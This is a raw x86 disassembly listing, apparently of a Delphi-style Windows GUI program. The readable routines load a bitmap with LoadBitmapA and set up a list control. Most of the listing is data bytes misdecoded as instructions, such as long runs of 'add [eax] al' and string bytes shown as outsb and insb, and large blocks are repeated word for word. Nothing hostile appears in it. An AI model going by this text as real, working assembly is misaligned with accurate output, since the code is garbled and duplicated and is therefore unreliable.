arpl [ ebx + 0x67 ] bp
jb r-xdata
outsd
outsb
je r-xdata
and al [ edx ]
push 0xe8ff0000
mov eax [ eax + eax - 0x8 ]
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040021 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
add al 0x46
insb
popad
je r-xdata
add bh bh
cwde
mov al 0x46
add [ ecx ] al
jb r-xdata
dec eax
jne r-xdata
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ edx ] ch
add [ ebx ] cl
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x4160f874
add [ eax ] bl
add al [ eax ]
[ eax + 0x18 ]
imul esp [ gs : edi + 0x68 ] 0x40103c74
add al cl
adc al 0x44
add [ edx + 0x10044 ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec ecx
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61500e00
jb r-xdata
outsb
je r-xdata
insb
outsd
jb r-xdata
and al 0x0
pop es
dec ecx
insd
dec ebp
outsd
pop esp
dec edx
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
dec ecx
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
add [ eax ] al
outsb
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ ecx + 0x62 ] dl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
pop eax
int3
add [ eax ] al
xor [ eax ] al
push es
push ebx
outsd
jb r-xdata
add al [ eax ]
call [ esi + edx + 0x44 ]
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
push ebx
outsb
je r-xdata
adc [ eax ] al
test eax 0x4cff0001
hlt
je r-xdata
outsb
jpo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
cmp al [ edx ]
add bh bh
push esp
push ss
inc esp
or [ eax + 0x6f ] edx
jo r-xdata
outsd
outsb
je r-xdata
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
xor al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
jo r-xdata
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
jb r-xdata
add bh bh
js r-xdata
outsb
jne r-xdata
dec edi
outsb
inc esp
popad
je r-xdata
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
bound ebp [ ebp + 0x14 ]
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
js r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] eax
add eax 0x6c797453
js r-xdata
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002f ] al
add [ eax ] al
cmp [ edx ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe945a2b5
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
mov ebp cs
inc ebx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0038 ] al
outsb
inc esp
popad
je r-xdata
pop es
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
adc [ eax ] al
cmp al 0x2
add bh bh
and al 0x15
inc esp
add [ ecx ] al
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc esp
add [ eax - 0xc ] bh
inc esp
add al bh
hlt
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003b ] al
outsb
inc esp
jb r-xdata
inc esi
imul ebp [ esi + 0x64 ] r-xdata
jo r-xdata
dec ebx
jns r-xdata
adc al 0x56
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
jo r-xdata
add bh bh
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
[ eax ]
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or al 0x4f
outsb
inc esp
popad
je r-xdata
add bh bh
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ ebx ] cl
jo r-xdata
insd
pop eax
cmp eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
cmp [ esi ] 0x44
add al ah
add [ eax ] eax
jmp eax
outsb
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
jb r-xdata
add [ eax ] al
add [ ecx ] 0x6
dec edi
outsb
inc ebp
js r-xdata
push esi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx + 0x56 ] si
inc ecx
add [ eax ] ch
add [ eax ] eax
popad
dec ebp
outsd
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
lodsd [ esi ]
inc ebx
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0045 ] al
outsb
dec ebp
popad
jae r-xdata
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004a ] al
inc esp
outsd
ja r-xdata
add [ ebx ] cl
dec edi
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
add eax [ eax ]
add [ eax ] al
push edi
jb r-xdata
outsb
push ebx
je r-xdata
dec edi
pop eax
cmp eax 0xe00044
add bh bh
loopne r-xdata
jo r-xdata
jb r-xdata
outsd
js r-xdata
jb r-xdata
sar [ 0xd80044 ] 0x1
add al bl
add [ eax ] al
xor al 0x3e
inc esp
add al ch
add [ eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
outsb
dec ebx
jns r-xdata
inc esp
add al bl
add [ eax ] eax
jb r-xdata
lodsb [ esi ]
inc ebx
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003d ] al
outsb
inc esp
jb r-xdata
add [ ecx - 0x1f5c0609 ] bl
jpo r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebp
outsd
jne r-xdata
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
outsb
push ebx
je r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
or [ eax ] 0x9
dec ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
popad
je r-xdata
add [ ecx + r-xdata ] esp
inc esp
jb r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] al
ja r-xdata
push esi
test dl dl
je r-xdata
mov [ fs : eax ] edx
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
push sub_46a5e0
mov eax [ ebp - 0x4 ]
call sub_403290
retn
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
movsd [ edi ] [ esi ]
inc esi
push ebp
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] bl
inc eax
jb r-xdata
dec eax
add [ ecx ] cl
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
add eax 0x3
popad
lea eax [ bx + si ]
inc esp
movsd [ edi ] [ esi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x46 ] al
popad
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440efc
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
call sub_426fac
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a5d9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_428094
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov dl 0x1
mov eax [ r-xdata ]
push esp
inc ebx
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x44786f42
add [ eax + 0x18004032 ] al
inc esp
outsd
outsb
inc ebp
outsb
je r-xdata
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
insd
in al dx
aas
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003e ] al
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46a053
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
push eax
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
xor al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
jo r-xdata
push cs
push eax
popad
je r-xdata
jae r-xdata
jb r-xdata
add bh bh
js r-xdata
outsb
jne r-xdata
add [ eax ] al
outsb
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and [ esp + eax * 2 + 0x100 ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
dec edi
outsb
inc esp
popad
je r-xdata
bound ebp [ ebp + 0x14 ]
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
js r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] eax
add eax 0x6c797453
js r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002f ] al
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ ecx + 0x62 ] dl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
pop eax
int3
add [ eax ] al
xor [ eax ] al
push es
push ebx
outsd
jb r-xdata
add al [ eax ]
call [ esi + edx + 0x44 ]
push 0x6948776f
outsb
je r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
push ebx
outsb
je r-xdata
add [ eax ] al
cmp [ edx ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe945a2b5
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
mov ebp cs
inc ebx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0038 ] al
outsb
inc esp
popad
je r-xdata
pop es
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
adc [ eax ] al
cmp al 0x2
add bh bh
and al 0x15
inc esp
add [ ecx ] al
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc esp
add [ eax - 0xc ] bh
inc esp
add al bh
hlt
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
cmp al [ edx ]
add bh bh
push esp
push ss
inc esp
je r-xdata
outsb
jpo r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003b ] al
outsb
inc esp
jb r-xdata
inc esi
imul ebp [ esi + 0x64 ] r-xdata
jo r-xdata
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
jb r-xdata
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61500e00
dec ebx
jns r-xdata
adc al 0x56
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
jo r-xdata
add bh bh
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
[ eax ]
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or al 0x4f
outsb
inc esp
popad
je r-xdata
add bh bh
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ ebx ] cl
jo r-xdata
insd
pop eax
cmp eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
cmp [ esi ] 0x44
add al ah
add [ eax ] eax
jmp eax
outsb
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
jb r-xdata
add [ eax ] al
add [ ecx ] 0x6
dec edi
outsb
inc ebp
js r-xdata
push esi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx + 0x56 ] si
inc ecx
add [ eax ] ch
add [ eax ] eax
popad
dec ebp
outsd
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
lodsd [ esi ]
inc ebx
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0045 ] al
outsb
dec ebp
popad
jae r-xdata
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004a ] al
inc esp
outsd
ja r-xdata
add [ ebx ] cl
dec edi
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
add eax [ eax ]
add [ eax ] al
push edi
jb r-xdata
outsb
push ebx
je r-xdata
dec edi
pop eax
cmp eax 0xe00044
add bh bh
loopne r-xdata
jo r-xdata
jb r-xdata
outsd
js r-xdata
jb r-xdata
sar [ 0xd80044 ] 0x1
add al bl
add [ eax ] al
xor al 0x3e
inc esp
add al ch
add [ eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
outsb
dec ebx
jns r-xdata
inc esp
add al bl
add [ eax ] eax
jb r-xdata
lodsb [ esi ]
inc ebx
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003d ] al
outsb
inc esp
jb r-xdata
add [ ecx - 0x1f5c0609 ] bl
jpo r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebp
outsd
jne r-xdata
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
outsb
push ebx
je r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
or [ eax ] 0x9
dec ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
popad
je r-xdata
add [ ecx + r-xdata ] esp
inc esp
jb r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] al
ja r-xdata
push esi
test dl dl
je r-xdata
mov [ fs : eax ] edx
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
push sub_46a5e0
mov eax [ ebp - 0x4 ]
call sub_403290
retn
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
movsd [ edi ] [ esi ]
inc esi
push ebp
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] bl
inc eax
jb r-xdata
dec eax
add [ ecx ] cl
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
add eax 0x3
popad
lea eax [ bx + si ]
inc esp
movsd [ edi ] [ esi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x46 ] al
popad
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440efc
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
call sub_426fac
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a5d9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_428094
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov dl 0x1
mov eax [ r-xdata ]
push esp
inc ebx
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x44786f42
add [ eax + 0x18004032 ] al
inc esp
outsd
outsb
inc ebp
outsb
je r-xdata
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
insd
in al dx
aas
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003e ] al
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46a560
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a5d9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_428094
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a5e0
mov eax [ ebp - 0x4 ]
call sub_403290
retn
add eax 0x3
sub_46a608
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440efc
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46a658
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x290 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440fe8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_46a688
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax ebx
call sub_441ab4
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov eax ebx
call sub_46a7a8
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
lea eax [ ebx + 0x290 ]
call sub_40d070
inc eax
mov [ esp ] eax
xor esi esi
mov edx esi
mov eax ebx
call sub_46af2c
mov edi eax
mov edx esi
mov eax [ ebx + 0x290 ]
call sub_418310
mov ebp eax
mov eax ebp
call sub_46a5f8
mov [ edi + 0x8 ] al
mov eax ebp
call sub_46a5fc
mov [ edi + 0x9 ] al
inc esi
dec [ esp ]
jne r-xdata
sub_46a6fc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_441b84
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x290 ] eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov edx esi
mov eax ebx
call sub_46ad18
xor al 0x1
push eax
mov edx esi
mov eax ebx
call sub_46ad44
pop edx
call sub_46a5e4
mov edx eax
mov eax [ ebx + 0x290 ]
call sub_4181b4
inc esi
dec edi
jne r-xdata
sub_46a7a8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x228 ]
call sub_4247d4
mov edx r-xdata
mov eax [ ebx + 0x228 ]
call sub_424730
mov esi eax
mov [ ebx + 0x284 ] esi
push esi
xor ecx ecx
mov edx 0x1a0
mov eax ebx
call sub_449ca8
sub_46a7fb
inc [ edx ]
add [ eax ] al
add [ edi + 0x67 ] dl
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46a788
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
push edi
lea esi [ ebp - 0x24 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_441f3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x252 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_46ad18
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x254 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x250 ] edx
mov [ eax + 0x254 ] edx
xor eax eax
push ebp
push sub_46a98a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_441f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x254 ] edx
retn
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_46b0ec
test al al
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
